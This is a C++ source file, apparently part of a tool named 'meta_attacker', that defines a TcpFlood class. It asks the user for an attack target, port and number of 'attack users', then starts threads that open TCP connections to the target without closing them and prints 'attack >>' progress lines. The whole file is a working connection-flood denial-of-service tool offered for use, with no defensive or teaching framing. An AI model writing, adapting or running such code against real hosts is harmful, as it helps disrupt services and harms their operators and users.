//
// Created by ubuntu-linux on 23-11-4.
//
#include <vector>
#include "iostream"
#include "meta_attacker.hpp"
#include "thread"
#include <functional>
#include "filesystem"
#include "unistd.h"

#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <cstring>
#include <unistd.h>

class TcpFlood {
public:
    TcpFlood() = default;

private:
    std::string target;
    int number = 0;
    int thread = 0;
    int port = 80;
    bool isAlways = false;
    int attack_number = 0;
public:
    void run_threads(int thread) {
        std::vector<std::thread> threads;
        for (int i = 0; i < thread; i++) {
            threads.emplace_back([this, i] { attack(i); });
        }
        for (auto& thread : threads) {
            thread.join();
        }
    }

    void attack(int i) {
        try {
            int sockfd = socket(AF_INET, SOCK_STREAM, 0);
            if (sockfd < 0) {
                perror("socket failed");
                return;
            }
            struct sockaddr_in server_addr{};
            server_addr.sin_family = AF_INET;
            server_addr.sin_port = htons(port);
            inet_pton(AF_INET, target.c_str(), &server_addr.sin_addr);
            if (connect(sockfd, (struct sockaddr *)&server_addr, sizeof(server_addr)) < 0) {
                perror("connect failed");
                return;
            }
            //send(sockfd, hello, strlen(hello), 0);
            attack_number += 1;
            if (number > 100 && attack_number % 10000 == 0) {
                std::cout << "[ Thread:"+ to_string(i) + " - Number:" + to_string(attack_number) +" ] attack >> " + target << std::endl;
            }
            if (number < 100){
                std::cout << "[ Thread:"+ to_string(i) + " - Number:" + to_string(attack_number) +" ] attack >> " + target << std::endl;
            }
            //close(sockfd);
        }catch (const std::exception& e) {
            cout << "socket error";
        }
    }

    void Console() {

        target = input("Input Your Attack Target: ");
        try {
            port = stoi(input("Input Target Port: "));
        }catch (const runtime_error& e) {
            cout << "Your input error." << endl;
            return;
        }
        try {
            thread = stoi(input("Input all the attack user number: "));
        }catch (const runtime_error& error)
        {
            std::cout << "[ERR] Your Input Error." << std::endl;
            return;
        }
        try {
            cout << "\n------------------------------------" << endl;
            run_threads(thread);
        }catch (const runtime_error& error) {
            std::cout << "[ERR] runtime Error." << std::endl;
            return;
        }
        cout << "Finish Attack" << endl;
    }
};